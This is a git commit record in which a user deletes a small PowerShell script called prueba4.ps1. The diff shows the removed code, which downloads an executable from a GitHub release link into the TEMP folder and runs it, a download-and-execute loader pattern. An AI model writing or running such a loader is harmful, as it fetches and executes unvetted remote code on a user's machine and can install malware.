a707532181c74ded4310241913462e7a084e97ce
mirapuedovolar2 <cuentaparametasimon@gmail.com>
2025-05-02 15:52:43 -0400

    Delete prueba4.ps1

--- prueba4.ps1
+++
@@ -1,7 +0,0 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola/este.exe"
-$destino = "$env:TEMP\este.exe"
-
-Invoke-WebRequest -Uri $url -OutFile $destino
-Start-Process -FilePath $destino
